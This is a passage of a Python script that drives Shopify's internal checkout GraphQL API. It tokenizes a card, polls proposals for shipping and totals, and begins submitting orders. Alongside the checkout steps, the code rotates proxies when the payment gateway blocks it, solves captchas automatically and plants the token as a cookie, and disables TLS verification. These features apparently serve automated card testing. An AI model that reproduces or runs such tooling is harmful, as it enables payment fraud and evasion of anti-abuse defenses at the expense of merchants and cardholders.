            "Sec-CH-UA-Mobile": "?0",
            "Sec-CH-UA-Platform": '"Windows"',
            "User-Agent": session.headers.get("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129 Safari/537.36"),
        }

        try:
            r = session.post(ep_url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [TOKEN] Request exception at {urlparse(ep_url).netloc}: {e}")
            continue

        last_status = r.status_code
        try:
            last_text_head = r.text[:300]
        except Exception:
            last_text_head = None

        if r.status_code == 200:
            try:
                token_data = r.json()
            except Exception:
                print(f"  [TOKEN] Invalid JSON from {urlparse(ep_url).netloc}")
                continue

            card_session_id = token_data.get("id")
            if card_session_id:
                print(f"  [OK] Card session ID: {card_session_id} via {urlparse(ep_url).netloc}")
                return card_session_id
            else:
                errs = token_data.get("errors") or token_data.get("error")
                if errs:
                    try:
                        print(f"  [TOKEN] {urlparse(ep_url).netloc} errors: {errs}")
                    except Exception:
                        pass
                continue
        else:
            if r.status_code == 403:
                print(f"  [TOKEN] 403 Forbidden - Proxy/IP blocked by payment gateway")
                print(f"  [TOKEN] This is a proxy issue, not a site issue")
            else:
                print(f"  [TOKEN] {urlparse(ep_url).netloc} HTTP {r.status_code}")
            continue

    if last_status == 403:
        print(f"  [ERROR] Tokenization blocked: 403 Forbidden")
        print(f"  [PROXY ISSUE] Payment gateway blocked your IP/proxy")
        print(f"  [SOLUTION] Try: 1) Different proxy, 2) Residential proxy, 3) Wait cooldown")
    elif last_status == 429:
        print(f"  [ERROR] Tokenization rate limited: 429 Too Many Requests")
        print(f"  [SOLUTION] Rotate proxy or wait before retry")
    else:
        print(f"  [ERROR] Tokenization failed across endpoints. last_status={last_status} head={last_text_head}")
    
    return None

def get_delivery_line_config(shipping_handle="any", destination_changed=True, merchandise_stable_id=None, use_full_address=False, phone_required=False, shipping_amount=None, currency_code="USD"):
    address_key = "streetAddress" if use_full_address else "partialStreetAddress"

    address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }

    if not use_full_address:
        address_data["address2"] = ""
        address_data["oneTimeUse"] = False
        address_data["coordinates"] = CHECKOUT_DATA.get("coordinates", {
            "latitude": 40.7589,
            "longitude": -73.9851
        })

    config = {
        "destination": {
            address_key: address_data
        },
        "targetMerchandiseLines": {"any": True} if not merchandise_stable_id else {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": destination_changed,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    if shipping_amount:
         config["expectedTotalPrice"] = {
             "value": {"amount": str(shipping_amount), "currencyCode": currency_code}
         }

    if phone_required:
        try:
            config["selectedDeliveryStrategy"]["options"] = {"phone": CHECKOUT_DATA["phone"]}
        except Exception:
            config["selectedDeliveryStrategy"]["options"] = {"phone": str(CHECKOUT_DATA.get("phone", "") or "")}

    return config

def poll_for_delivery_and_expectations(session, checkout_token, session_token, merchandise_stable_id, max_attempts=7):
    print(f"  [POLL] Waiting for delivery terms and expectations...")
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": "any",
                "customDeliveryRate": False
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    shipping_handle = None
    shipping_amount = None
    delivery_expectations = []
    queue_token = None
    
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        
        r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        
        if r.status_code != 200:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(SHORT_SLEEP)
            continue
        
        try:
            response = r.json()
            
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                time.sleep(SHORT_SLEEP)
                continue
            
            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
            
            if result.get('__typename') != 'NegotiationResultAvailable':
                time.sleep(SHORT_SLEEP)
                continue
            
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            exp_typename = delivery_exp_terms.get('__typename')
            
            checkout_total = seller_proposal.get('checkoutTotal', {})
            actual_total = None
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                actual_total = checkout_total.get('value', {}).get('amount')
            
            print(f"  Status - Delivery: {delivery_typename}, Expectations: {exp_typename}")
            
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  ✓ Got shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        
                        delivery_line["selectedDeliveryStrategy"] = {
                            "deliveryStrategyByHandle": {
                                "handle": shipping_handle,
                                "customDeliveryRate": False
                            },
                            "options": {
                                "phone": CHECKOUT_DATA["phone"]
                            }
                        }
                        if shipping_amount:
                            delivery_line["expectedTotalPrice"] = {
                                "value": {"amount": str(shipping_amount), "currencyCode": "USD"}
                            }
                        
                        payload["variables"]["delivery"]["deliveryLines"][0] = delivery_line
            
            if exp_typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  ✓ Got {len(delivery_expectations)} delivery expectations")
            
            if shipping_handle and delivery_expectations and actual_total:
                print(f"  [POLL] ✓ Complete! Handle: {shipping_handle[:30]}..., Total: ${actual_total}")
                return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations
            
            poll_delay = 500
            if delivery_typename == 'PendingTerms':
                poll_delay = delivery_terms.get('pollDelay', 500)
            elif exp_typename == 'PendingTerms':
                poll_delay = delivery_exp_terms.get('pollDelay', 500)
            
            wait_seconds = min(poll_delay / 1000.0, MAX_WAIT_SECONDS)
            time.sleep(wait_seconds)
            
        except Exception as e:
            print(f"  [ERROR] {e}")
            time.sleep(SHORT_SLEEP)
            continue
    
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return queue_token, shipping_handle, shipping_amount, actual_total, delivery_expectations

def detect_phone_requirement(seller_proposal):
    try:
        delivery_terms = seller_proposal.get('delivery', {})
        if delivery_terms.get('__typename') == 'FilledDeliveryTerms':
            delivery_lines = delivery_terms.get('deliveryLines', [])
            for line in delivery_lines:
                strategies = line.get('availableDeliveryStrategies', [])
                for strategy in strategies:
                    phone_required = strategy.get('phoneRequired', False)
                    if phone_required:
                        print(f"  [DETECT] ✓ Phone number IS required")
                        return True
        
        print(f"  [DETECT] Phone number NOT required")
        return False
    except Exception as e:
        print(f"  [DETECT] Error detecting: {e}")
        return True

def poll_proposal(session, checkout_token, session_token, merchandise_stable_id, shipping_handle, phone_required=False, shipping_amount=None, max_attempts=5):
    print(f"  [POLL] Polling for delivery expectations...")
    
    if not shipping_handle:
        print(f"  [POLL] No shipping handle available yet, skipping poll")
        return None, []
    
    url = f"{SHOP_URL}/checkouts/unstable/graphql?operationName=Proposal"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = {
        "destination": {
            "partialStreetAddress": {
                "address1": CHECKOUT_DATA["address1"],
                "city": CHECKOUT_DATA["city"],
                "countryCode": CHECKOUT_DATA["country"],
                "firstName": CHECKOUT_DATA["first_name"],
                "lastName": CHECKOUT_DATA["last_name"],
                "zoneCode": CHECKOUT_DATA["province"],
                "postalCode": CHECKOUT_DATA["zip"],
                "phone": CHECKOUT_DATA["phone"],
                "oneTimeUse": False
            }
        },
        "targetMerchandiseLines": {"lines": [{"stableId": merchandise_stable_id}]},
        "deliveryMethodTypes": ["SHIPPING"],
        "destinationChanged": False,
        "selectedDeliveryStrategy": {
            "deliveryStrategyByHandle": {
                "handle": shipping_handle,
                "customDeliveryRate": False
            },
            "options": {
                "phone": CHECKOUT_DATA["phone"]
            }
        },
        "expectedTotalPrice": {"any": True}
    }
    
    if shipping_amount:
        delivery_line["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": "USD"}}
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {
                "lines": [],
                "acceptUnexpectedDiscounts": True
            },
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    for attempt in range(max_attempts):
        print(f"  Attempt {attempt + 1}/{max_attempts}...")
        
        try:
            r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)
        except Exception as e:
            print(f"  [ERROR] HTTP request failed: {e}")
            time.sleep(SHORT_SLEEP)
            continue
        
        if r.status_code == 200:
            try:
                response = r.json()
                
                if attempt == 0 and not SUMMARY_ONLY:
                    with open("poll_response.json", "w") as f:
                        json.dump(response, f, indent=2)
                
                if 'errors' in response:
                    print(f"  [ERROR] GraphQL errors:")
                    for error in response['errors']:
                        print(f"    - {error.get('message', 'Unknown')}")
                    time.sleep(2)
                    continue
                
                result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})
                seller_proposal = result.get('sellerProposal', {})
                delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
                
                typename = delivery_exp_terms.get('__typename')
                
                if typename == 'FilledDeliveryExpectationTerms':
                    print(f"  [POLL] ✓ Ready!")
                    
                    expectations = delivery_exp_terms.get('deliveryExpectations', [])
                    delivery_expectations = []
                    for exp in expectations:
                        signed_handle = exp.get('signedHandle')
                        if signed_handle:
                            delivery_expectations.append({"signedHandle": signed_handle})
                    
                    queue_token = result.get('queueToken')
                    print(f"  [POLL] Found {len(delivery_expectations)} expectations")
                    
                    return queue_token, delivery_expectations
                
                elif typename == 'PendingTerms':
                    poll_delay = delivery_exp_terms.get('pollDelay', 2000)
                    wait_seconds = min(poll_delay / 1000.0, 3.0)
                    time.sleep(wait_seconds)
                    continue
                else:
                    print(f"  [WARNING] Unexpected typename: {typename}")
                    time.sleep(2)
                    continue
                    
            except Exception as e:
                print(f"  [ERROR] {e}")
                time.sleep(2)
                continue
        else:
            print(f"  [ERROR] HTTP {r.status_code}")
            time.sleep(2)
            continue
    
    print(f"  [POLL] Timed out after {max_attempts} attempts")
    return None, []

def step3_proposal(session, checkout_token, session_token, card_session_id, shop_url, variant_id, merchandise_stable_id=None):
    print("[3/5] Submitting proposal...")

    url = f"{shop_url}/checkouts/unstable/graphql?operationName=Proposal"
    if not merchandise_stable_id:
        merchandise_stable_id = str(uuid.uuid4())
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-web-source-id': checkout_token,
        'x-checkout-one-session-token': session_token,
    }
    
    query = """query Proposal($delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,$payment:PaymentTermInput,$merchandise:MerchandiseTermInput,$buyerIdentity:BuyerIdentityTermInput,$taxes:TaxTermInput,$sessionInput:SessionTokenInput!,$tip:TipTermInput,$note:NoteInput,$scriptFingerprint:ScriptFingerprintInput,$optionalDuties:OptionalDutiesInput,$cartMetafields:[CartMetafieldOperationInput!],$memberships:MembershipsInput){session(sessionInput:$sessionInput){negotiate(input:{purchaseProposal:{delivery:$delivery,discounts:$discounts,payment:$payment,merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,tip:$tip,note:$note,scriptFingerprint:$scriptFingerprint,optionalDuties:$optionalDuties,cartMetafields:$cartMetafields,memberships:$memberships}}){__typename result{...on NegotiationResultAvailable{queueToken sellerProposal{deliveryExpectations{...on FilledDeliveryExpectationTerms{deliveryExpectations{signedHandle __typename}__typename}...on PendingTerms{pollDelay __typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{availableDeliveryStrategies{...on CompleteDeliveryStrategy{handle phoneRequired amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}}}}"""
    
    delivery_line = get_delivery_line_config(
        shipping_handle="any",
        destination_changed=True,
        merchandise_stable_id=None,
        phone_required=True
    )
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "postalCode": CHECKOUT_DATA["zip"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    payload = {
        "operationName": "Proposal",
        "query": query,
        "variables": {
            "delivery": {
                "deliveryLines": [delivery_line],
                "noDeliveryRequired": [],
                "supportsSplitShipping": True
            },
            "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
            "payment": {
                "totalAmount": {"any": True},
                "paymentLines": [],
                "billingAddress": {"streetAddress": billing_address_data}
            },
            "merchandise": {
                "merchandiseLines": [{
                    "stableId": merchandise_stable_id,
                    "merchandise": {
                        "productVariantReference": {
                            "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                            "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                            "properties": [],
                            "sellingPlanId": None
                        }
                    },
                    "quantity": {"items": {"value": 1}},
                    "expectedTotalPrice": {"any": True},
                    "lineComponents": []
                }]
            },
            "buyerIdentity": {
                "customer": {"presentmentCurrency": "USD", "countryCode": CHECKOUT_DATA["country"]},
                "email": CHECKOUT_DATA["email"]
            },
            "taxes": {"proposedTotalAmount": {"any": True}},
            "sessionInput": {"sessionToken": session_token},
            "tip": {"tipLines": []},
            "note": {"message": None, "customAttributes": []},
            "scriptFingerprint": {
                "signature": None,
                "signatureUuid": None,
                "lineItemScriptChanges": [],
                "paymentScriptChanges": [],
                "shippingScriptChanges": []
            },
            "optionalDuties": {"buyerRefusesDuties": False},
            "cartMetafields": [],
            "memberships": {"memberships": []}
        }
    }
    
    r = session.post(url, json=payload, headers=headers, timeout=HTTP_TIMEOUT_SHORT, verify=False)

    # Check if captcha is required (detected in response)
    if CAPTCHA_SOLVER_ENABLED and r.status_code == 200:
        try:
            response_check = r.json()
            response_str = json.dumps(response_check).lower()
            # Only trigger on actual captcha errors/challenges, not just mentions
            if ('captcha_required' in response_str or
                'captcha_error' in response_str or
                'challenge_required' in response_str or
                'recaptcha' in response_str and 'error' in response_str):
                print("\n[CAPTCHA] 🚨 Captcha detected in GraphQL response!")
                print("[CAPTCHA] Solving captcha...")
                captcha_token = solve_captcha_auto(SHOP_URL, max_retries=MAX_CAPTCHA_RETRIES)
                if captcha_token:
                    print(f"[CAPTCHA] ✅ Captcha solved! Token: {captcha_token[:30]}...")
                    session.cookies.set('_captcha_token', captcha_token)
                    # Update result with captcha status
                    result["captcha_solved"] = True
                    result["captcha_token"] = captcha_token
                else:
                    print("[CAPTCHA] ⚠️ Captcha solving failed, continuing anyway...")
                    result["captcha_solved"] = False
        except:
            pass

    if r.status_code == 200:
        try:
            response = r.json()
            
            if not SUMMARY_ONLY:
                with open("proposal_response.json", "w") as f:
                    json.dump(response, f, indent=2)
            
            if 'errors' in response:
                print(f"  [ERROR] GraphQL errors:")
                for error in response['errors']:
                    print(f"    - {error.get('message', 'Unknown')}")
                return None, None, None, None, None, False, None, None

            result = response.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {})

            if result.get('__typename') != 'NegotiationResultAvailable':
                return None, None, None, None, None, False, None, None
            
            queue_token = result.get('queueToken')
            seller_proposal = result.get('sellerProposal', {})
            
            phone_required = detect_phone_requirement(seller_proposal)
            
            shipping_handle = None
            shipping_amount = None
            delivery_terms = seller_proposal.get('delivery', {})
            delivery_typename = delivery_terms.get('__typename')
            
            if delivery_typename == 'FilledDeliveryTerms':
                delivery_lines = delivery_terms.get('deliveryLines', [])
                if delivery_lines:
                    strategies = delivery_lines[0].get('availableDeliveryStrategies', [])
                    if strategies:
                        shipping_handle = strategies[0].get('handle')
                        amount_constraint = strategies[0].get('amount', {})
                        if amount_constraint.get('__typename') == 'MoneyValueConstraint':
                            shipping_amount = amount_constraint.get('value', {}).get('amount')
                        print(f"  [OK] Shipping handle: {shipping_handle[:50] if shipping_handle else 'None'}...")
                        if shipping_amount:
                            print(f"  [OK] Shipping amount: ${shipping_amount}")
            elif delivery_typename == 'PendingTerms':
                print(f"  [INFO] Delivery terms are pending (will need to wait)")
            
            actual_total = None
            currency_code = "USD"
            checkout_total = seller_proposal.get('checkoutTotal', {})
            if checkout_total.get('__typename') == 'MoneyValueConstraint':
                value = checkout_total.get('value', {})
                actual_total = value.get('amount')
                currency_code = value.get('currencyCode', 'USD')
                if actual_total:
                    print(f"  [OK] Total: ${actual_total} {currency_code}")
            
            delivery_expectations = []
            delivery_exp_terms = seller_proposal.get('deliveryExpectations', {})
            typename = delivery_exp_terms.get('__typename') if isinstance(delivery_exp_terms, dict) else None
            
            if typename == 'FilledDeliveryExpectationTerms':
                expectations = delivery_exp_terms.get('deliveryExpectations', [])
                for exp in expectations:
                    signed_handle = exp.get('signedHandle')
                    if signed_handle:
                        delivery_expectations.append({"signedHandle": signed_handle})
                print(f"  [OK] Found {len(delivery_expectations)} expectations")
            
            elif typename == 'PendingTerms':
                print(f"  [INFO] Expectations pending...")
                
                if delivery_typename == 'PendingTerms':
                    print(f"  [INFO] Both delivery and expectations pending - using comprehensive poll")
                    poll_result = poll_for_delivery_and_expectations(
                        session, checkout_token, session_token, merchandise_stable_id
                    )
                    
                    if poll_result[0]:
                        queue_token_new, shipping_handle_new, shipping_amount_new, actual_total_new, delivery_expectations_new = poll_result
                        if queue_token_new:
                            queue_token = queue_token_new
                        if shipping_handle_new:
                            shipping_handle = shipping_handle_new
                        if shipping_amount_new:
                            shipping_amount = shipping_amount_new
                        if actual_total_new:
                            actual_total = actual_total_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                        print(f"  [OK] Poll complete - Handle: {shipping_handle[:30] if shipping_handle else 'None'}...")
                    else:
                        print(f"  [WARNING] Comprehensive polling failed")
                
                elif shipping_handle:
                    print(f"  [INFO] Starting poll with handle: {shipping_handle[:50]}...")
                    polled_data = poll_proposal(
                        session, checkout_token, session_token, merchandise_stable_id, 
                        shipping_handle, phone_required, shipping_amount
                    )
                    
                    if polled_data and polled_data[0]:
                        queue_token_new, delivery_expectations_new = polled_data
                        if queue_token_new:
                            queue_token = queue_token_new
                        delivery_expectations = delivery_expectations_new if delivery_expectations_new else []
                    else:
                        print(f"  [WARNING] Polling failed, continuing without expectations")
                else:
                    print(f"  [WARNING] No shipping handle available, skipping poll")
            
            print(f"  [INFO] Phone Required: {phone_required}")
            
            return queue_token, shipping_handle, merchandise_stable_id, actual_total, delivery_expectations, phone_required, currency_code, shipping_amount

        except json.JSONDecodeError:
            print(f"  [ERROR] Invalid JSON")
            return None, None, None, None, None, False, None, None
    else:
        print(f"  [ERROR] Failed: {r.status_code}")
        return None, None, None, None, None, False, None, None

def step4_submit_completion(session, checkout_token, session_token, queue_token, 
                           shipping_handle, merchandise_stable_id, card_session_id,
                           actual_total, delivery_expectations, shop_url, variant_id, payment_method_identifier=None, phone_required=False, currency_code="USD", shipping_amount=None):
    print("[4/5] Submitting for completion...")
    print(f"  [INFO] Phone requirement: {phone_required}")
    print(f"  [INFO] Currency: {currency_code}")

    if not actual_total:
        return None, "MISSING_TOTAL", "No total amount"

    url = f"{shop_url}/checkouts/unstable/graphql?operationName=SubmitForCompletion"
    attempt_token = f"{checkout_token}-{uuid.uuid4().hex[:10]}"
    
    headers = {
        'shopify-checkout-client': 'checkout-web/1.0',
        'shopify-checkout-source': f'id="{checkout_token}", type="cn"',
        'x-checkout-one-session-token': session_token,
        'x-checkout-web-source-id': checkout_token,
    }
    
    query = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitAlreadyAccepted{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{errors{__typename code localizedMessage}__typename}...on Throttled{pollAfter __typename}...on SubmittedForCompletion{receipt{...on ProcessedReceipt{id __typename}...on ProcessingReceipt{id __typename}__typename}__typename}__typename}}"""
    
    delivery_line = get_delivery_line_config(
        shipping_handle=shipping_handle,
        destination_changed=False,
        merchandise_stable_id=merchandise_stable_id,
        use_full_address=True,
        phone_required=True,
        shipping_amount=shipping_amount,
        currency_code=currency_code
    )
    
    billing_address_data = {
        "address1": CHECKOUT_DATA["address1"],
        "city": CHECKOUT_DATA["city"],
        "countryCode": CHECKOUT_DATA["country"],
        "postalCode": CHECKOUT_DATA["zip"],
        "firstName": CHECKOUT_DATA["first_name"],
        "lastName": CHECKOUT_DATA["last_name"],
        "zoneCode": CHECKOUT_DATA["province"],
        "phone": CHECKOUT_DATA["phone"]
    }
    
    delivery_expectation_lines = []
    for exp in delivery_expectations:
        delivery_expectation_lines.append({"signedHandle": exp["signedHandle"]})
    
    payment_amount = actual_total

    # Get captcha token from session cookies (if solved earlier)
    captcha_token = session.cookies.get('_captcha_token')

    input_data = {
        "sessionInput": {"sessionToken": session_token},
        "queueToken": queue_token,
        "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
        "delivery": {
            "deliveryLines": [delivery_line],
            "noDeliveryRequired": [],
            "supportsSplitShipping": True
        },
        "merchandise": {
            "merchandiseLines": [{
                "stableId": merchandise_stable_id,
                "merchandise": {
                    "productVariantReference": {
                        "id": f"gid://shopify/ProductVariantMerchandise/{VARIANT_ID}",
                        "variantId": f"gid://shopify/ProductVariant/{VARIANT_ID}",
                        "properties": [],
                        "sellingPlanId": None
                    }
                },
                "quantity": {"items": {"value": 1}},
                "expectedTotalPrice": {"any": True},
